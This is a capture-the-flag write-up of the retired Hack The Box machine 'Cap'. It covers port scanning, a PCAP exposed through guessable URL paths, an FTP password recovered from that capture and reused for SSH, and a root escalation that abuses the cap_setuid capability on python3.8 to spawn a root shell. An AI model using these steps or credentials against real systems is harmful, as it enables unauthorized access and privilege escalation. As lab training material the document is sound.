# Cap

This is the write-up for the box Cap that got retired at the 2nd October 2021.
My IP address was 10.10.14.3 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.245    cap.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/cap.nmap 10.10.10.245
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
(...)
```

## Checking HTTP (Port 80)

The website shows a dashboard of security events, failed login attempts and port scans.
There is a menu on the left side with different pages:
- _Security Snapshot (5 Second PCAP + Analysis)_
  - The _Download_ button offers a **PCAP file**
- _IP Config_
  - Shows the output of the `ifconfig` command
- _Network Status_
  - Shows the output of the `netstat` command

The PCAP file is on the path _/data/1_ and by testing other numbers, there seems to be another PCAP file on _/data/0_.
In the file _0.pcap_ are credentials for the FTP service:
```
220 (vsFTPd 3.0.3)
USER nathan
331 Please specify the password.
PASS Buck3tH4TF0RM3!
230 Login successful.
(...)
```

## Checking FTP (Port 21)

Login to the FTP service with the found credentials:
```
ftp 10.10.10.245
```

The current directory is the home folder of the user _nathan_ and it is possible to enumerate all directories on the box:
```
ftp> pwd
Remote directory: /home/nathan

ftp> cd /
250 Directory successfully changed.
```

This indicates that the password probably also works for the user to login via SSH:
```
ssh nathan@10.10.10.245
```

## Privilege Escalation

The web application runs on **Python Flask** and in the code _/var/www/html/app.py_, the _command_ variable sets the privileges to root before running `tcpdump`:
```
# (...)
# permissions issues with gunicorn and threads. hacky solution for now.

command = f"""python3 -c 'import os; os.setuid(0); os.system("timeout 5 tcpdump -w {path} -i any host {ip}")'"""
os.system(command
# (...)
```

The binary _/usr/bin/python3.8_ has the _cap_setuid_ **capability** set:
```
getcap /usr/bin/python3*

/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

Executing the **Python3.8 interpreter** and setting the permissions to root:
```
/usr/bin/python3.8
```
```
>>> import os
>>> os.setuid(0)
>>> os.system('sh')

# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
```

After setting the permission, it is possible to start a shell as root!
